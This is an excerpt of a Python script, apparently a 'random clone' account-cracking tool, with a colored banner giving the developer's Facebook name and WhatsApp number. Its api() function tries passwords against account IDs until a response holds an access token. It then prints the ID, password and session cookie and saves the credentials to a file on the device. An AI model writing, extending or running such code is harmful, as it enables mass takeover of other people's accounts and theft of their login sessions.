...
logo= ("""        
     ...
     .888.      `888'   `888'  d8P'  `Y8b  
    .8"888.      888     888  888          
   .8' `888.     888ooooo888  888          
  .88ooo8888.    888     888  888          
 .8'     `888.   888     888  `88b    ooo  
o88o     o8888o o888o   o888o  `Y8bood8P'  \x1b[38;5;197m(V4)
\x1b[38;5;77m──────────────────────────────────────────────                 
\x1b[38;5;78m〘✧〙DEVLOPER  \x1b[38;5;222m➤  \x1b[38;5;78m Asadul islam(AI)
\x1b[38;5;79m〘✧〙FACEBOOK  \x1b[38;5;222m➤  \x1b[38;5;79m Asaduzzaman Asad
\x1b[38;5;115m〘✧〙WHATSAPP  \x1b[38;5;222m➤   \x1b[38;5;115m+8801797883404
\x1b[38;5;78m〘✧〙TOOLS     \x1b[38;5;222m➤   \x1b[38;5;78mRANDOM CLONE    \x1b[38;5;197m(PRIVATE)
\x1b[38;5;77m──────────────────────────────────────────────""")
def linex():
...
def bhoot():
    ...
    os.system("clear")
    print(logo)
    print(f'\x1b[38;5;155m[✧] LIMIT EXAMPLE : 50000,100000 ')
    ...
    print('TOTAL AHC OK \033[1;92m'+str(len(oks)))
    
def api(ids,pwv,tl):
    global loop,oks,cps,twf
    sys.stdout.write(f'\r\x1b[38;5;155m[➤] AHC~FINDING  \x1b[38;5;155m[{loop}]  \x1b[38;5;155mOK :- {GREEN}{len(oks)} ');sys.stdout.flush()
    try:
        for pas in pwv:
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\x1b[38;5;84m[AHC-LIVE] '+ids+' ~~ '+pas+'\x1b[38;5;155m')
                print('\033[1;92m[COOKIE] : ➤ : '+kuki+'\x1b[38;5;223m');linex()
                oks.append(ids)
                open('/sdcard/AHC-OKS.txt','a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
